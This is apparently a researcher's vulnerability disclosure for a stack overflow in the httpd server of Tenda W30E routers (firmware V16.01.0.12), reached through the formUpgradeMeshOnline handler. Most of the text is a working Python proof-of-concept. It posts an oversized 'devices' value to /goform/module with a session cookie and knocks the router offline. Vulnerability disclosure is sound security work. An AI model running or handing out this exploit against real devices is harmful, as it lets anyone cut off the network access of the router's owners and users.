# Tenda W30E Stack Overflow

**Vender** ：Tenda

**Firmware version**:V16.01.0.12(4843)

**Exploit Author**: GD@hillstone

**Vendor Homepage**: https://www.tenda.com.cn/



## POC

httpd in directory `/bin` has a stack overflow vulnerability. The vulnerability occurrs in the `formUpgradeMeshOnline` function, which can be accessed via the URL `upgradeMeshOnline`

![1](./1.jpg)



When we send packets, the router will be dos

```
#!/usr/bin/env python
# -*- coding: UTF-8 -*-


import sys
import time
import string
import socket
from random import Random
import urllib, urllib2, httplib
from pwn import *

 
class HTTP:
    HTTP = 'http'
 
    def __init__(self, host, proto=HTTP, verbose=False):
        self.host = host
        self.proto = proto
        self.verbose = verbose
        self.encode_params = True
 
    def Encode(self, data):
        
        if type(data) == dict:
            pdata = []
            for k in data.keys():
                pdata.append(k + '=' + data[k])
            data = pdata[1] + '&' + pdata[0]
        else:
            data = urllib.quote_plus(data)
        return data
 
    def Send(self, uri, headers={}, data=None, response=False,encode_params=True):
        html = ""
        if uri.startswith('/'):
            c = ''
        else:
            c = '/'
 
        url = '%s://%s' % (self.proto, self.host)
        uri = '/%s' % uri
        #if data is not None:
            #data = self.Encode(data)
        data='{"upgradeMeshOnline":{"devices":"'+'e'*0x500+'"}}'
        print data
        if self.verbose:
            print url
        httpcli = httplib.HTTPConnection(self.host, 80, timeout=30)
        httpcli.request('POST',uri,data,headers=headers)
        response=httpcli.getresponse()
        print response.status
        print response.read()
 
if __name__ == '__main__':
    #Fireitup
    session='W30EV2.0:0.171.1:6f03da'
    ip = '192.168.0.1'  
    # 构造http数据包
    s='1'
    pdata = {

        'aaa'  :   'bbb' ,
        'ccc'  :   'dddd'
        }

    header = {
        'Cookie'        : 'bLanguage=cn; sessionid='+session,
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type'  : 'application/x-www-form-urlencoded',
        'User-Agent'    : 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
        }
    # 发起http请求
    try:
        HTTP(ip).Send('/goform/module', data=pdata,headers=header,encode_params=False,response=True)
        print '[+] execute ok'
    except httplib.BadStatusLine:
        print "Payload deliverd."
    except Exception,e:
        print "2Payload delivery failed: %s" % str(e)


```

![poc](./poc.jpg)

![poc1](./poc1.jpg)

![poc2](./poc2.jpg)

